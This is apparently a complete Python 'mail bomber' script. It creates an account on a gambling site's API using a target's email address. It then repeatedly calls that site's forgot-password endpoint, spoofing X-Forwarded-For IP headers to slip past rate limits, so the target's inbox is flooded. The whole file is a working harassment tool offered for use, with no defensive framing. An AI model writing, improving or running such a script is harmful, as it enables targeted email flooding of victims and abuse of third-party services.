import requests
import random
from termcolor import colored


logo = """
------------------------------------------------------------------
------------------------------------------------------------------
--------M---A---I---L----------B---O---M---B---E---R--------------
------------------------------------------------------------------
--------------------m00nissmiling---------------------------------

- username contain only number and small letters
- ip range is like (133.4.5) or (122.6.7)
- count is mail count to bomb
- email is target email
"""

print(colored(logo,"red"))
username = input(colored("random name to create account:","blue"))
input_email = input(colored("email :","yellow"))
input_count = int(input(colored("count :","blue")))
input_ip  = input(colored("ip Network 3 range >","yellow"))

log_file = open('log/log.txt','a')
log_file.write(f'[sub] Email Bomber --> Target email - {input_email}-- count - {input_count}\n')
log_file.close()

def send():
 for i in range(0,input_count):
  for o in range(random.randint(1,255)):
   ip_range = f"{input_ip}.{o}"
   headers = {'Host': 'ex-api3-41.jjrrff.com',
   'X-Forwarded-For': ip_range,
   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
   'Accept': 'application/json',
   'Content-Type': 'application/json',
   'Content-Length': '67'}

  json_data = {"Domain":"www.dragoneleven.com","Email":input_email}
  aa = requests.post("https://ex-api3-41.jjrrff.com/api//player/v2/forgot-password", headers=headers, json=json_data)
  if aa.status_code == 200:
   print(colored("sent!! -","red"),i)

def create():
 headers = {'Host': 'ex-api3-41.jjrrff.com',
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
  'Accept': 'application/json',
  'Content-Type': 'application/json',
  'Content-Length': '67'}

 json_data2 = {"Domain":"www.dragoneleven.com","Username":username,"Password":"test111","Currency":"MMK","CompanyFlowSettings":[{"PropertyName":"Email","PropertyValue":input_email},{"PropertyName":"Phone","PropertyValue":"09667556445"}],"Referral":"","Url":"https://www.dragoneleven.com/register","Ip":"69.160.24.41","LoginCountry":"MM","Region":"06","City":"Yangon","Platform":"desktop","Browser":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0","Fingerprint":"b7418950-5917-3a75-9d46-86091ab0b337"}
 dd = requests.post("https://ex-api3-41.jjrrff.com/api//player/v2/register/join-now", headers=headers, json=json_data2)
 
create()
send()
